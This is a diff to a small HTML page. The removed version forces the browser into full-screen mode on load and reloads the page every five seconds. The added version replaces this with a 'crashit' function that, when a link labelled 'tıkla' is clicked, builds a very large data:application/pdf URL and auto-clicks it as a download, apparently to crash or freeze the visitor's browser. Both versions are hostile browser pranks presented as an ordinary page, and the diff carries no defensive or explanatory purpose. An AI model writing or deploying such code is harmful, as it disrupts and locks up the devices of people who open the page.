@@ -1,35 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>a</title>
-</head>
-<body>
-    <p>ball.</p>
+ <head>
+  <script type="text/javascript">
 
-    <script>
-        // Function to enter full-screen mode
-        function enterFullScreen() {
-            var elem = document.documentElement; // Get the HTML element
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen();
-            } else if (elem.msRequestFullscreen) {
-                elem.msRequestFullscreen();
-            } else if (elem.mozRequestFullScreen) {
-                elem.mozRequestFullScreen();
-            } else if (elem.webkitRequestFullscreen) {
-                elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
-            }
-        }
+    function crashit() {
+                    var arr = new Array();
+                    for (var i = 0; i < 300000; i++) {
+                        arr[i] = (i % 256);
+                    }
+                    var blob = 'data:application/pdf,' + arr;
+                    var link = document.createElement("a");
+                    link.download = "attachment";
+                    link.href = blob;
+                    link.textContent = "really"
+                    document.body.appendChild(link);
+                    link.click();
+    }
 
-        // Call the function when the page loads
-        window.onload = function() {
-            enterFullScreen();
-
-            // Redirect to the same site after a delay (e.g., 5 seconds)
-            setTimeout(function() {
-                window.location.href = window.location.href;
-            }, 5000); // 500 milliseconds = 5 seconds
-        };
-    </script>
-</body>
+  </script>
+ </head>
+ <body>
+     <a href="#" onclick="crashit(); return false;">tıkla</a>
+ </body>
 </html>
